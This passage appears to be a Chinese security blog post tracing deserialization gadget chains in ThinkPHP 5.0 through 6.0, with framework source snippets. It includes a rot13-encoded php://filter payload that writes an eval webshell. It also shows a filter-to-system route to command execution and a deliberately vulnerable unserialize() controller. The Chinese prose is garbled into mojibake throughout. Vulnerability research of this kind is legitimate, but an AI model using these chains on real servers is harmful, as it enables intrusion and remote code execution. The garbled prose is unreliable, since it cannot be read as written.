null;è¿™é‡Œçœ‹çœ‹$valueä¸$atträ¾æ¬¡æ˜¯æ€ä¹ˆè¢«èµ‹å€¼çš„ã€‚value 123$relation = Loader::parseName($name, 1, false);$modelRelation = $this-&gt;$relation();$value = $this-&gt;getRelationData($modelRelation); ä¸»è¦æ˜¯å¯¹$nameè°ƒç”¨parseNameã€‚è€Œ$nameæ¥è‡ªå¯æ§æ•°ç»„$this-&gt;appendã€‚ä¹Ÿå°±æ˜¯è¯´ã€‚$modelrelationæ˜¯Modelè¿™ä¸ªç±»ä»»æ„æ–¹æ³•çš„è¿”å›å€¼ã€‚(.$relation())ã€‚æ‰€ä»¥æ‰¾ä¸€ä¸ªç›´æ¥è¿”å›å¯æ§æ•°æ®çš„æ–¹æ³•å³å¯ã€‚æ¯”å¦‚getError 1234public function getError()&#123; return $this-&gt;error;&#125; å›åˆ°ä¸Šé¢ã€‚ç°åœ¨æˆ‘ä»¬ç»§ç»­è·Ÿè¿›getRelationData 1234567891011121314protected function getRelationData(Relation $modelRelation)&#123; if ($this-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)) &#123; $value = $this-&gt;parent; &#125; else &#123; // é¦–å…ˆè·å–å…³è”æ•°æ® if (method_exists($modelRelation, 'getRelation')) &#123; $value = $modelRelation-&gt;getRelation(); &#125; else &#123; throw new BadMethodCallException('method not exists:' . get_class($modelRelation) . '-&gt; getRelation'); &#125; &#125; return $value;&#125; é¦–å…ˆå®ƒæ¥æ”¶çš„å‚æ•°æ˜¯Relationç±»çš„ã€‚æ‰€ä»¥æˆ‘ä»¬ä¸Šé¢è¿”å›çš„ç»“æœ$this-&gt;errorè‚¯å®šä¹Ÿæ˜¯ä¸€ä¸ªRelationçš„å¯¹è±¡äº†ã€‚ï¼ˆRelationä¹Ÿæ˜¯æŠ½è±¡ç±»ã€‚æ‰€ä»¥å®ä¾‹åŒ–æ—¶è¦ç”¨å®ƒçš„å­ç±»ï¼‰ç„¶åæ­¤å¤„æˆ‘ä»¬è‡ªç„¶è¦èµ°ç¬¬ä¸€ä¸ªifåˆ†æ”¯æ¥æ§åˆ¶è¿”å›å€¼ã€‚åˆ†åˆ«çœ‹ä¸‹isSelfRelation()è·ŸgetModel()å‘ç°éƒ½åªæ˜¯ç®€å•è¿”å›this-&gt;relationä¸this-&gt;query-&gt;model()ã€‚å…¨éƒ¨å¯æ§ã€‚é‚£åªå‰©ä¸‹è®©get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)æˆç«‹äº†ã€‚æ„æ€å°±æ˜¯$modelRelation-&gt;getModel()å’Œ$this-&gt;parentä¸ºåŒç±»ï¼Œä¹Ÿå°±æ˜¯è¦æ±‚$value-&gt;getAttr($attr)ä¸­çš„$valueå’Œä¸Šé¢å¯æ§çš„modelä¸ºåŒç±»é‚£ä¹ˆç°åœ¨$value-&gt;getAttr($attr)çš„valueè·Ÿå®Œäº†ã€‚æˆ‘ä»¬æ¥çœ‹çœ‹$attr 1234$bindAttr = $modelRelation-&gt;getBindAttr();if ($bindAttr) &#123; foreach ($bindAttr as $key =&gt; $attr) ...... ä¸Šé¢æåˆ°è¿‡ï¼ŒmodelRelationå› ä¸ºå–è‡ªå¯æ§æ–¹æ³•æ‰€ä»¥æ˜¯ä»»æ„å€¼ã€‚æˆ‘ä»¬ç›´æ¥å…¨å±€æ‰¾getBindAttræ–¹æ³•ã€‚åªæœ‰ä¸€ä¸ªæ¥å£ç±»:Relationçš„å­ç±»OnetoOne 1234public function getBindAttr()&#123; return $this-&gt;bindAttr;&#125; æ•°æ®å¯æ§ã€‚ä¸è¿‡OnetoOneæ˜¯æŠ½è±¡ç±»ã€‚æ‰€ä»¥ç»§ç»­æ‰¾å­ç±»ã€‚è¿™é‡Œå°±åªæœ‰ä¸¤ä¸ªå­ç±»ã€‚æˆ‘ä»¬é€‰æ‹©HasOne. ç°åœ¨ã€‚æˆ‘ä»¬åšåˆ°äº†ä»»æ„è°ƒç”¨__callã€‚å‰©ä¸‹çš„å°±æ˜¯æ‰¾å¯ç”¨çš„__callã€‚ é‚£ä¹ˆå…¨å±€æ‰¾å¯ç”¨çš„__callã€‚æ­¤å¤„å¯ä»¥æ‰¾åˆ°think\\console\\Output ç±»ã€‚ 12345678910111213public function __call($method, $args)&#123; if (in_array($method, $this-&gt;styles)) &#123; array_unshift($args, $method); return call_user_func_array([$this, 'block'], $args); &#125; if ($this-&gt;handle &amp;&amp; method_exists($this-&gt;handle, $method)) &#123; return call_user_func_array([$this-&gt;handle, $method], $args); &#125; else &#123; throw new Exception('method not exists:' . __CLASS__ . '-&gt;' . $method); &#125;&#125; é‚£ä¹ˆé¦–å…ˆä¸Šé¢è§¦å‘ç‚¹é‡Œ$this-&gt;parentè‚¯å®šæ˜¯è¦ä¼ Outputç±»çš„å®ä¾‹äº†ã€‚ä¸‹é¢çœ‹è¿™é‡Œçš„$this-&gt;block() 1234567891011121314protected function block($style, $message)&#123; $this-&gt;writeln(\"&lt;&#123;$style&#125;&gt;&#123;$message&#125;&lt;/$style&gt;\");&#125;public function writeln($messages, $type = self::OUTPUT_NORMAL)&#123; $this-&gt;write($messages, true, $type);&#125;public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)&#123; $this-&gt;handle-&gt;write($messages, $newline, $type);&#125; è°ƒç”¨çš„æ˜¯$this-&gt;handle-&gt;writeã€‚æ—¢ç„¶$this-&gt;handleå¯æ§,é‚£ä¹ˆæ­¤å¤„æ‰¾ä¸€ä¸ªåŒåçš„writeæ–¹æ³•ã€‚æˆ‘ä»¬å…¨å±€æœç´¢æ‰¾åˆ°Memcachedç±» 1234public function write($sessID, $sessData)&#123; return $this-&gt;handler-&gt;set($this-&gt;config['session_name'] . $sessID, $sessData, $this-&gt;config['expire']);&#125; åŒç†ã€‚è¿˜æ˜¯å¯ä»¥å…¨å±€æ‰¾setæ–¹æ³•ã€‚ç¬¬ä¸€ä¸ªå°±æ˜¯æˆ‘ä»¬æ›¾ç»åœ¨tp5RCEä¸­è§åˆ°çš„Fileç±» 123456789101112131415161718192021222324252627public function set($name, $value, $expire = null)&#123; if (is_null($expire)) &#123; $expire = $this-&gt;options['expire']; &#125; if ($expire instanceof \\DateTime) &#123; $expire = $expire-&gt;getTimestamp() - time(); &#125; $filename = $this-&gt;getCacheKey($name, true); if ($this-&gt;tag &amp;&amp; !is_file($filename)) &#123; $first = true; &#125; $data = serialize($value); if ($this-&gt;options['data_compress'] &amp;&amp; function_exists('gzcompress')) &#123; //æ•°æ®å‹ç¼© $data = gzcompress($data, 3); &#125; $data = \"&lt;?php\\n//\" . sprintf('%012d', $expire) . \"\\n exit();?&gt;\\n\" . $data; $result = file_put_contents($filename, $data); if ($result) &#123; isset($first) &amp;&amp; $this-&gt;setTagItem($filename); clearstatcache(); return true; &#125; else &#123; return false; &#125;&#125; ä¹‹å‰æ›¾ç»è¯´è¿‡rceæ—¶ç¼“å­˜æ–‡ä»¶åä¸å¯æ§ã€‚ä½†æ˜¯åœ¨ååºåˆ—åŒ–ä¸­å°±ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜ã€‚ 1234567891011121314151617181920$filename = $this-&gt;getCacheKey($name, true);protected function getCacheKey($name, $auto = false)&#123; $name = md5($name); if ($this-&gt;options['cache_subdir']) &#123; // ä½¿ç”¨å­ç›®å½• $name = substr($name, 0, 2) . DS . substr($name, 2); &#125; if ($this-&gt;options['prefix']) &#123; $name = $this-&gt;options['prefix'] . DS . $name; &#125; $filename = $this-&gt;options['path'] . $name . '.php'; $dir = dirname($filename); if ($auto &amp;&amp; !is_dir($dir)) &#123; mkdir($dir, 0755, true); &#125; return $filename;&#125; æ–‡ä»¶åæ¥è‡ª$filename = $this-&gt;options[&#39;path&#39;] . $name . &#39;.php&#39;;.å¯æ§ã€‚æˆ‘ä»¬å†çœ‹æ–‡ä»¶å†…å®¹å¦‚ä½•æ§åˆ¶ã€‚ 1$data = \"&lt;?php\\n//\" . sprintf('%012d', $expire) . \"\\n exit();?&gt;\\n\" . $data; è¿™é‡Œå°±æ˜¯popé“¾æœ€å¤§çš„éš¾ç‚¹äº†ã€‚$dataå…¶å®å¹¶ä¸å¯æ§ã€‚å…·ä½“å¯ä»¥å›æº¯åˆ°æˆ‘åˆšåˆšä¸Šé¢æ”¾çš„ä¸€è¿ä¸²è°ƒç”¨writeæ–¹æ³•çš„æºç å¤„ã€‚æ³¨æ„åˆ° 1234public function writeln($messages, $type = self::OUTPUT_NORMAL)&#123; $this-&gt;write($messages, true, $type);&#125; writeç¬¬äºŒä¸ªå‚æ•°æ˜¯å†™æ­»çš„trueã€‚å®ƒä¼šä¸€è·¯ä¼ åˆ°Fileç±»ä½œä¸º$dataå†™å…¥ã€‚é‚£ä¹ˆæˆ‘ä»¬å†™æ–‡ä»¶ç­‰äºæ§åˆ¶ä¸äº†å†™å…¥å†…å®¹ã€‚ ä½†æ˜¯æ²¡æœ‰å…³ç³»ã€‚setåœ¨è¿™ä¸ªfile_put_contentsä¸‹è¿˜è°ƒç”¨äº†ä¸€ä¸ªå‡½æ•°setTagItem 123456789101112131415protected function setTagItem($name)&#123; if ($this-&gt;tag) &#123; $key = 'tag_' . md5($this-&gt;tag); $this-&gt;tag = null; if ($this-&gt;has($key)) &#123; $value = explode(',', $this-&gt;get($key)); $value[] = $name; $value = implode(',', array_unique($value)); &#125; else &#123; $value = $name; &#125; $this-&gt;set($key, $value, 0); &#125;&#125; åœ¨è¿™é‡Œæˆ‘ä»¬åˆä¸€æ¬¡è°ƒç”¨äº†setã€‚å¹¶ä¸”ä¸¤ä¸ªå‚æ•°å…¨éƒ¨å¯æ§ã€‚æ‰€ä»¥æœ€åå¾ªç¯è°ƒç”¨æˆ‘ä»¬å°±çŸ¥é“,å†™å…¥æ–‡ä»¶çš„æ–‡ä»¶åä¸ºmd5(&#39;tag_&#39; . md5($this-&gt;tag)).&#39;.php&#39;ã€‚å†…å®¹ä¸º$data = &quot;&lt;?php\\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data; å½“ç„¶ã€‚è¿™é‡Œæ˜¾ç„¶å­˜åœ¨ä¸€ä¸ªç»•è¿‡æ­»äº¡exitçš„é—®é¢˜ã€‚ä½¿ç”¨rot13å³å¯ã€‚ç„¶årot13çš„payloadç»•ä¸è¿‡é»˜è®¤çš„çŸ­æ ‡ç­¾ã€‚æ‰€ä»¥ä¼šéœ€è¦åŠ è¿‡æ»¤å™¨ç»„åˆæ‹³ã€‚é™¤äº†å¸¸è§çš„base64ï¼ŒWMCTFä¸­ä½¿ç”¨åˆ°å…¶ä»–çš„iconvæˆ–è€…å…¶ä»–ç»„åˆä¹Ÿæ˜¯å¯è¡Œçš„ã€‚åŸç†ä¸å†èµ˜è¿°é‚£ä¹ˆã€‚æ§åˆ¶payloadåªè¦æ§åˆ¶Fileç±»$this-&gt;options[&#39;path&#39;] = php://filter/write=string.rot13/resource=&lt;?cuc @riny($_TRG[_]);?&gt;å³å¯ã€‚ æ‰§è¡Œexpæ‰“çš„è¯ã€‚ä¼šå‘ç°å­˜åœ¨ä¸¤ä¸ªæ–‡ä»¶ã€‚è¿™æ˜¯ä¸Šé¢æˆ‘ä»¬è°ƒç”¨äº†ä¸¤æ¬¡setçš„ç¼˜æ•…ã€‚è€Œæ–‡ä»¶åç”±æˆ‘ä»¬çš„$tagå†³å®šã€‚å…·ä½“è®¡ç®—æ–¹æ³•ä¹Ÿåœ¨ä¸Šé¢æåŠäº†ã€‚å½“ç„¶æœ€å¥½çš„æ–¹æ³•æ°¸è¿œæ˜¯æœ¬åœ°è‡ªå·±æ‰“ä¸€éã€‚è¿™æ ·æ‰èƒ½ç¡®ä¿¡æ–‡ä»¶åè¿™ç§è¿œç¨‹ä¸å¯è§çš„ä¸œè¥¿ã€‚ å¦å¤–æˆ‘ç›¸ä¿¡å¤§å®¶è‚¯å®šå‘ç°è¿™ä¸ªpopé“¾æœ‰ä¸ªå˜æ‹›ã€‚é‚£å°±æ˜¯linux,windowsé€šç”¨çš„å†™ç›®å½•ã€‚å›åˆ°ä¸Šé¢getCacheKey 12345$dir = dirname($filename);if ($auto &amp;&amp; !is_dir($dir)) &#123;mkdir($dir, 0755, true);&#125; åªè¦æŠŠ$this-&gt;options[&#39;path&#39;]è®¾ç½®ä¸ºç›®å½•çš„è¯ã€‚ç›´æ¥å¯ä»¥å†™755æƒé™ç›®å½•ã€‚ SCTF2020 è€ƒå¯Ÿtp5.024é‚£é“é¢˜å½“æ—¶ä½¿ç”¨äº†pythonè„šæœ¬é«˜å¼ºåº¦åˆ æ–‡ä»¶ã€‚å¯¼è‡´æˆ‘ä»¥ä¸ºå½“å‰ç›®å½•ä¸å¯å†™ã€‚ä½†æ˜¯æ¢æˆå†™ç›®å½•çš„payloadåå‘ç°å¯ä»¥åˆ›å»ºç›®å½•ã€‚å¹¶ä¸”å¯ä»¥å­˜åœ¨ç›¸åŒäºé¶æœºé‡å¯æ—¶é—´çš„3åˆ†é’Ÿã€‚æ‰€ä»¥ä½¿ç”¨è¿™ç§payloadé»‘ç›’æ¢æµ‹ä¸å¤±ä¸ºä¸€ç§åŠæ³•ã€‚ tp5.1.x-unserializeä»Šå¤©æ¥è·Ÿä¸‹5.1çš„popé“¾ã€‚ç›¸æ¯”5.0è€Œè¨€æ€è·¯å¤§è‡´ç›¸åŒã€‚åªæœ‰å‡ ä¸ªç±»çš„åŒºåˆ«ã€‚å¹¶ä¸”å…¶expå·²ç»é›†æˆåˆ°phpggcä¸Šäº†ã€‚ è¿˜æ˜¯ä»èµ·ç‚¹å¼€å§‹çœ‹ã€‚è·Ÿæ˜¨å¤©5.0çš„é“¾å­æ˜¯ä¸€æ ·çš„ã€‚ä»Windowsç±»å¼€å§‹ã€‚ç„¶å=&gt;file_exists =&gt; toString()ã€‚ç„¶åæ¥ç€å…¨å±€æœç´¢ã€‚æ­¤å¤„åˆ©ç”¨Conversionçš„toString() =&gt; __toJson() =&gt; toArray()è€Œä¸æ˜¯5.0ä¸­çš„Modelç±» çœ‹åˆ°thinkphp\\library\\think\\model\\concern\\Conversion.phpä¸­çš„toArray() .æˆ‘ä»¬åŒæ ·å¯»æ‰¾å¯ä»¥è§¦å‘__call()çš„ä»£ç  æ­¤å¤„ä¸»è¦æ˜¯$relation-&gt;visible($name)ä¼šè§¦å‘__call.é€‰æ‹©è¿™ä¸€å¤„çš„ä»£ç æ˜¯å› ä¸º,relationæ¥è‡ª$this-&gt;getRelation($key).$nameæ¥è‡ª$this-&gt;append.çœ‹åˆ°getRelation 123456789public function getRelation($name = null)&#123; if (is_null($name)) &#123; return $this-&gt;relation; &#125; elseif (array_key_exists($name, $this-&gt;relation)) &#123; return $this-&gt;relation[$name]; &#125; return;&#125; æˆ‘ä»¬è¦è¿›å…¥visbleçš„åˆ†æ”¯ã€‚å¿…é¡»è¦$relationä¸ºç©ºã€‚æ‰€ä»¥$this-&gt;relationç›´æ¥ç½®ç©ºå³å¯ã€‚ æ­¤æ—¶$relationç”±$relation = $this-&gt;getAttr($key);å†³å®šã€‚å®ƒä¼šä¾æ¬¡è°ƒç”¨\\thinkphp\\library\\think\\model\\concern\\Attribute.php çš„getAttr()ä¸getData() 12345678910111213141516171819 public function getAttr($name, &amp;$item = null)&#123; try &#123; $notFound = false; $value = $this-&gt;getData($name); &#125; catch (InvalidArgumentException $e) &#123; ......public function getData($name = null)&#123; if (is_null($name)) &#123; return $this-&gt;data; &#125; elseif (array_key_exists($name, $this-&gt;data)) &#123; return $this-&gt;data[$name]; &#125; elseif (array_key_exists($name, $this-&gt;relation)) &#123; return $this-&gt;relation[$name]; &#125; throw new InvalidArgumentException('property not exists:' . static::class . '-&gt;' . $name);&#125; è¿™æ ·å°±èƒ½ç¡®è®¤æˆ‘ä»¬çš„$relationæ¥è‡ªAttributeç±»çš„$this-&gt;data[$name]. ç°åœ¨éœ€è¦æ³¨æ„çš„æ˜¯ã€‚æˆ‘ä»¬å¿…é¡»å¾—æ‰¾åˆ°ä¸€ä¸ªæ—¢èƒ½è°ƒç”¨Conversionè¿˜èƒ½è°ƒç”¨Attributeå±æ€§çš„ç±»ã€‚å³ç»§æ‰¿äº†Attributeç±»å’ŒConversionç±»çš„å­ç±»ã€‚è¿™ä¸ªå…¶å®å°±æ˜¯æˆ‘ä»¬ä¹‹å‰5.0é“¾å­ä¸­ç”¨è¿‡çš„Model.phpã€‚åŠ ä¸ŠModelæ˜¯æŠ½è±¡ç±»ã€‚æ‰€ä»¥ç¼–å†™expä¸­ä½¿ç”¨å®ƒçš„å­ç±»Pivotå®ä¾‹åŒ–ã€‚è¿™ç‚¹ä¸å¿…å¤šè¯´ã€‚ æ¥ä¸‹æ¥çœ‹$relation-&gt;visible($name)ä¸­çš„$name.å®ƒæ˜¯éå†$this-&gt;appendå¾—åˆ°çš„ã€‚å¯æ§ã€‚åªéœ€æ³¨æ„å°†å…¶èµ‹å€¼ä¸ºæ•°ç»„å³å¯ã€‚(å› ä¸ºè¦è¿›å…¥if (is_array($name))çš„åˆ†æ”¯) æ—¢ç„¶å·²ç»æ‹¥æœ‰è§¦å‘__callçš„æ¡ä»¶äº†ã€‚æˆ‘ä»¬ç°åœ¨æ‰¾ä¸€ä¸ªå¯ç”¨çš„__callã€‚5.1ç‰ˆæœ¬ä¸­çš„gadgetå°±æ˜¯æ¥è‡ªRequestç±»çš„__callã€‚ 123456789public function __call($method, $args)&#123; if (array_key_exists($method, $this-&gt;hook)) &#123; array_unshift($args, $this); return call_user_func_array($this-&gt;hook[$method], $args); &#125; throw new Exception('method not exists:' . static::class . '-&gt;' . $method);&#125; æ˜¾ç„¶$this-&gt;hookå¯ä»¥è®©æˆ‘ä»¬æ§åˆ¶ä¸º[&quot;visable&quot;-&gt;&quot;arbitrary method&quot;]è¿™ä¸ªæ•°ç»„ä»»æ„è°ƒç”¨æ–¹æ³•ã€‚ä½†æ˜¯æ³¨æ„array_unshift($args, $this)ä¼šå¼ºè¡ŒæŠŠ$thisæ”¾åˆ°$argsæ•°ç»„çš„ç¬¬ä¸€ä½ã€‚å…¶åæœæ˜¯æ€æ ·çš„å‘¢ï¼Ÿæˆ‘ä»¬çœ‹ä¸‹call_user_func_array 123call_user_func_array([$obj,\"arbitrary method\"],[$this,$arg])=&gt;$obj-&gt;$func($this,$argv) è¿™ç§æ–¹æ³•æ‰§è¡Œå‡ ä¹æ²¡æœ‰ã€‚æ‰€ä»¥è¿™å°±é™åˆ¶æˆ‘ä»¬è¦æ‰¾ä¸€ä¸ªä¸å—è¿™ç§è°ƒç”¨æ–¹å¼å½±å“çš„å‡½æ•°ã€‚ åœ¨ä»¥å‰tp5çš„æ¼æ´åˆ†æä¸­,æ›¾ç»ç”¨åˆ°è¿‡think\\Requestç±»ä¸­çš„input æ–¹æ³•ã€‚é‡Œé¢æœ‰call_user_func($filter,$data)å¯ä»¥ç”¨äºå‘½ä»¤æ‰§è¡Œã€‚ä½†æ˜¯å‰é¢è¯´è¿‡ï¼Œ $args æ•°ç»„å˜é‡çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œæ˜¯ä¸€ä¸ªå›ºå®šæ­»çš„ç±»å¯¹è±¡ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥è°ƒç”¨ input æ–¹æ³•ï¼Œè€Œåº”è¯¥å¯»æ‰¾è°ƒç”¨ input çš„æ–¹æ³•ã€‚ æ•´ä¸ªRequestç±»ä¸­ä¸€å…±æœ‰7å¤„è°ƒç”¨inputæ–¹æ³•çš„å…¶ä»–æ–¹æ³•ã€‚æˆ‘ä»¬é€‰æ‹©paramæ–¹æ³•ä¸ºä¾‹ 1234567891011121314151617181920212223242526272829303132333435public function param($name = '', $default = null, $filter = '')&#123; if (!$this-&gt;mergeParam) &#123; $method = $this-&gt;method(true); // è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡ switch ($method) &#123; case 'POST': $vars = $this-&gt;post(false); break; case 'PUT': case 'DELETE': case 'PATCH': $vars = $this-&gt;put(false); break; default: $vars = []; &#125; // å½“å‰è¯·æ±‚å‚æ•°å’ŒURLåœ°å€ä¸­çš„å‚æ•°åˆå¹¶ $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false)); $this-&gt;mergeParam = true; &#125; if (true === $name) &#123; // è·å–åŒ…å«æ–‡ä»¶ä¸Šä¼ ä¿¡æ¯çš„æ•°ç»„ $file = $this-&gt;file(); $data = is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param; return $this-&gt;input($data, '', $default, $filter); &#125; return $this-&gt;input($this-&gt;param, $name, $default, $filter);&#125; è°ƒç”¨äº†inputæ–¹æ³•ä½†æ˜¯åªæœ‰ä¸€ä¸ª$paramæ˜¯å¯æ§çš„ã€‚æ‰€ä»¥è¿˜è¦ç»§ç»­æ‰¾è°ƒç”¨paramçš„æ–¹æ³•ã€‚ 12345678910111213public function isAjax($ajax = false)&#123; $value = $this-&gt;server('HTTP_X_REQUESTED_WITH'); $result = 'xmlhttprequest' == strtolower($value) ? true : false; if (true === $ajax) &#123; return $result; &#125; $result = $this-&gt;param($this-&gt;config['var_ajax']) ? true : $result; $this-&gt;mergeParam = false; return $result;&#125; isAjaxæ–¹æ³•è¿”å›å€¼ç”±$this-&gt;config[&#39;var_ajax&#39;]æ§åˆ¶ã€‚é‚£ä¹ˆç­‰äºæ§åˆ¶äº†paramçš„å‚æ•°$name.ç­‰äºæ§åˆ¶äº†input çš„å‚æ•°$name. æœ€åå†æ¥åˆ°inputæ–¹æ³•è¿™çœ‹è°ƒç”¨ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445public function input($data = [], $name = '', $default = null, $filter = '')&#123; if (false === $name) &#123; // è·å–åŸå§‹æ•°æ® return $data; &#125; $name = (string) $name; if ('' != $name) &#123; // è§£æname if (strpos($name, '/')) &#123; list($name, $type) = explode('/', $name); &#125; $data = $this-&gt;getData($data, $name); if (is_null($data)) &#123; return $default; &#125; if (is_object($data)) &#123; return $data; &#125; &#125; // è§£æè¿‡æ»¤å™¨ $filter = $this-&gt;getFilter($filter, $default); if (is_array($data)) &#123; array_walk_recursive($data, [$this, 'filterValue'], $filter); if (version_compare(PHP_VERSION, '7.1.0', '&lt;')) &#123; // æ¢å¤PHPç‰ˆæœ¬ä½äº 7.1 æ—¶ array_walk_recursive ä¸­æ¶ˆè€—çš„å†…éƒ¨æŒ‡é’ˆ $this-&gt;arrayReset($data); &#125; &#125; else &#123; $this-&gt;filterValue($data, $name, $filter); &#125; if (isset($type) &amp;&amp; $data !== $default) &#123; // å¼ºåˆ¶ç±»å‹è½¬æ¢ $this-&gt;typeCast($data, $type); &#125; return $data;&#125; getDataé¡ºç€çœ‹ä¸€ä¸‹å¯æ§ã€‚ä¸”$data=$data[$name],$filteræ¥è‡ª$this-&gt;filter.æœ€ååˆ°äº†array_walk_resursiveç›¸å½“äºç›´æ¥å¯¹æ•°ç»„æ¯ä¸€ä¸ªå€¼è°ƒç”¨äº†å›è°ƒå‡½æ•°$this-&gt;filterValue($filter)ã€‚ 12if (is_array($data)) &#123; array_walk_recursive($data, [$this, 'filterValue'], $filter); $this-&gt;filterValueæ˜¯é€šè¿‡call_user_funcæ‰§è¡Œçš„è‡ªç„¶ä¸å¿…è¯´äº†ã€‚æ—¢ç„¶å¦‚æ­¤ã€‚æ§åˆ¶$this-&gt;filterä¸ºsystem,$dataæ•°ç»„ç¬¬ä¸€ä¸ªå€¼ä¸ºå‘½ä»¤whoamiä¹‹ç±»çš„å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†ã€‚ è‡³æ­¤popé“¾å°±å®Œæ•´äº†ã€‚å…¶å®ä¸­é—´æœ‰ä¸ªæ­¥éª¤å°±æ˜¯è§£å†³call_user_func_arrayé‚£æ‰¾åˆ°ä¸å—å®šæ­»å‚æ•°å½±å“çš„å‘½ä»¤æ‰§è¡Œè¿™å—,ä¸»è¦æ€è·¯å°±æ˜¯åˆ©ç”¨thinkphpè¿‡æ»¤å™¨,è¦†ç›–filterçš„æ–¹æ³•å»æ‰§è¡Œä»£ç ã€‚è€Œåœ¨æ‰¾åˆ°inputä½œä¸ºä¸»è¦ä¸‹æ‰‹ç‚¹æ—¶,call_user_func_array(array(ä»»æ„ç±»,ä»»æ„æ–¹æ³•),$args) ä¸­ $args æ•°ç»„çš„ç¬¬ä¸€ä¸ªå˜é‡ï¼Œå³æˆ‘ä»¬å‰é¢è¯´çš„ä¸€ä¸ªå›ºå®šæ­»çš„ç±»å¯¹è±¡ä¼šä½œä¸º $data ä¼ ç»™ input æ–¹æ³•ï¼Œé‚£ä¹ˆåœ¨å¼ºè½¬æˆå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œæ¡†æ¶å°±ä¼šæŠ¥é”™é€€å‡ºã€‚æ‰€ä»¥æˆ‘ä»¬æ‰¾ä¸åˆ°å°±ç»§ç»­æ‰¾ä¸Šå±‚è°ƒç”¨inputçš„å‡½æ•°ã€‚ç›´åˆ°æ‰¾åˆ°å¯æ§å‚æ•°çš„å‡½æ•°isAjax.å°±èƒ½è§£å†³å‚æ•°ä¸å¯æ§çš„é—®é¢˜ã€‚ tp5.2.x-unserialize5.2ç‰ˆæœ¬çš„é“¾å­è²Œä¼¼è·Ÿä¹‹å‰æ²¡å•¥åŒºåˆ«ã€‚ä½†æ˜¯æˆ‘composerä¸€ç›´å®‰è£…ä¸ä¸Šã€‚åŠ ä¸Š5.2ç‰ˆæœ¬ä½œä¸ºdevç‰ˆæœ¬æœ¬èº«å‡ºç°çš„ä¸å¤š,æ‰€ä»¥è¿™é‡Œç”¨thinkphp-vulné‡Œçš„ä¾‹å­ç®€å•æä¸€ä¸‹ã€‚ å‰é¢å…¥æ‰‹ç‚¹å¤§åŒå°å¼‚ã€‚å”¯ä¸€æœ‰åŒºåˆ«çš„åœ°æ–¹åœ¨è§¦å‘__callçš„ä»£ç $relation-&gt;visible($name)è¿™ã€‚çœ‹ä¼¼tp5.2å·²ç»æŠŠè¿™å¥ä»£ç åˆ äº†ã€‚ä½†æ˜¯å®é™…ä¸Šæ˜¯è¢«è½¬ç§»åˆ°äº†appendAttrToArrayè¿™ä¸ªæ–¹æ³•ä¸­ã€‚å› æ­¤åŸºæœ¬æ²¡æœ‰åŒºåˆ«ã€‚æˆ‘å°±ä¸è·Ÿäº†ã€‚ æ”¾ä¸Šå‡ å¼ å›¾ çœŸæ­£çš„æ‰§è¡Œç‚¹åœ¨ä¸‹é¢çš„$closure($value,$this-&gt;data)è¿™é‡Œçš„åŠ¨æ€è°ƒç”¨ã€‚å‚æ•°å‡å¯æ§ã€‚æ‰€ä»¥èµ‹å€¼å‘½ä»¤æ‰§è¡Œçš„å‚æ•°å³å¯ã€‚ tp6.0.x-unserializeä»Šå¤©é‡æ–°çœ‹äº†ä¸‹ä¹‹å‰åœ¨ phpæ¡†æ¶ååºåˆ—åŒ–ç»ƒä¹  æ–‡ç« é‡Œçš„å†…å®¹ã€‚æ‰æƒ³èµ·æ¥5.2è·Ÿ6.0çš„é“¾å­åº”è¯¥æ˜¯è·Ÿè¿‡äº†ã€‚ä¸è¿‡å½“æ—¶æ²¡æœ‰åŠ¨æ€è°ƒè¯•,ç†è§£ä¹Ÿæ²¡é‚£ä¹ˆæ·±åˆ»ã€‚æ‰€ä»¥è¿˜æ˜¯å†çœ‹ä¸€ä¸‹ã€‚ è¿˜æ˜¯è€æ ·å­æ›´æ”¹Index.php 1234567891011&lt;?phpnamespace app\\controller;class Index&#123; public function index() &#123; $u = unserialize($_GET['c']); return 'ThinkPHP V6.x'; &#125;&#125; ç›´æ¥ç”¨wh1t3p1g å¸ˆå‚…é›†æˆå¥½çš„ã€‚é¡ºå¸¦ä¹Ÿæ¨èä¸‹å¸ˆå‚…åœ¨å®‰å…¨å®¢ä¸Šé’ˆå¯¹thinkphpé“¾å­çš„åˆ†ææ–‡ç« ã€‚ é¦–å…ˆ6.0ç‰ˆæœ¬çš„ä¸»è¦é—®é¢˜æ˜¯å‰é¢5.*ç‰ˆæœ¬çš„åˆ©ç”¨èµ·ç‚¹Windowsç±»éƒ½æ²¡äº†ã€‚ä¹Ÿå°±æ˜¯å°‘äº†ä¸€ä¸ª__destruct()ã€‚é‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ›¿ä»£çš„__destructä½œä¸ºèµ·ç‚¹ã€‚å¹¶ä¸”æœ€å¥½å®ƒèƒ½å¤Ÿåœ¨ä¸­é—´æŸä¸ªç¯èŠ‚èµ·åˆ°ä¸å…¶ä»–é“¾å­ç›¸åŒä½œç”¨æ¯”å¦‚è§¦å‘__call,__toStringä¹‹ç±»çš„ã€‚è¿™æ ·çš„é€»è¾‘ä¹Ÿæ˜¯ç¬¬5ç©ºé—´laravelé‚£é¢˜çš„è§£é¢˜æ€è·¯å§ã€‚å› ä¸ºè·Ÿè¿‡é“¾å­çš„äººéƒ½çŸ¥é“åªéœ€è¦ä¸¤ä¸ªç±»å°±èƒ½rce.æ—¢ç„¶å…¶ä¸­ä¸€ä¸ªdestructè¢«å¤„ç†äº†ã€‚æ‰¾ä¸€ä¸ªæ›¿ä»£çš„è‡ªç„¶æ˜¯æœ€ç®€å•çš„åŠæ³•ã€‚ vendor/topthink/think-orm/src/Model.php 123456public function __destruct()&#123; if ($this-&gt;lazySave) &#123; $this-&gt;save(); &#125;&#125; æ„é€ lazySaveä¸ºçœŸå€¼ã€‚è¿›å…¥saveå‡½æ•° 